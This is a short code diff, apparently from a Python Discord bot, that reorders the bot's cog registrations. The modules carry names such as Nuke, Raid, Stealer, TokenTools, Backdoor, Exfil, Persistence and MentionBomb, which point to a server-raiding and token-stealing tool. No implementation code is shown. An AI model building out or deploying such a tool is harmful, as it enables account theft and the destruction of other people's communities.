-    await bot.add_cog(EmojiTools(bot))
-    await bot.add_cog(EventSabotage(bot))
-    await bot.add_cog(Exfil(bot))
-    await bot.add_cog(Exploit(bot))
-    await bot.add_cog(HiddenCommands(bot))
+    await bot.add_cog(Cloner(bot))
+    await bot.add_cog(ChannelManip(bot))
+    await bot.add_cog(Music(bot))
     await bot.add_cog(Injection(bot))
-    await bot.add_cog(InviteTools(bot))
-    await bot.add_cog(MentionBomb(bot))
-    await bot.add_cog(MessageManip(bot))
     await bot.add_cog(Nuke(bot))
     await bot.add_cog(Persistence(bot))
+    await bot.add_cog(TokenTools(bot))
+    await bot.add_cog(Backdoor(bot))
+    await bot.add_cog(ThreadBomb(bot))
+    await bot.add_cog(Admin(bot))
+    await bot.add_cog(Automation(bot))
+    await bot.add_cog(HiddenCommands(bot))
+    await bot.add_cog(Webhook(bot))
+    await bot.add_cog(Exploit(bot))
+    await bot.add_cog(Exfil(bot))
+    await bot.add_cog(Spammer(bot))
     await bot.add_cog(PsychOps(bot))
-    await bot.add_cog(Raid(bot))
     await bot.add_cog(ReactionAbuse(bot))
+    await bot.add_cog(EmojiTools(bot))
+    await bot.add_cog(Raid(bot))
     await bot.add_cog(Recon(bot))
+    await bot.add_cog(EventSabotage(bot))
+    await bot.add_cog(ServerAnalyzer(bot))
+    await bot.add_cog(InviteTools(bot))
+    await bot.add_cog(VoiceManip(bot))
+    await bot.add_cog(Anime(bot))
+    await bot.add_cog(AdvancedAdmin(bot))
+    await bot.add_cog(MessageManip(bot))
+    await bot.add_cog(Stealer(bot))
+    await bot.add_cog(MentionBomb(bot))
     await bot.add_cog(Scheduler(bot))
     await bot.add_cog(Scraper(bot))
-    await bot.add_cog(ServerAnalyzer(bot))
-    await bot.add_cog(Spammer(bot))
-    await bot.add_cog(Stealer(bot))
-    await bot.add_cog(ThreadBomb(bot))
-    await bot.add_cog(TokenTools(bot))
-    await bot.add_cog(VoiceManip(bot))
-    await bot.add_cog(Webhook(bot))
     await bot.add_cog(WebhookAdvanced(bot))
     await bot.add_cog(AdvancedCheats(bot))
     await bot.add_cog(AdvancedLogger(bot))
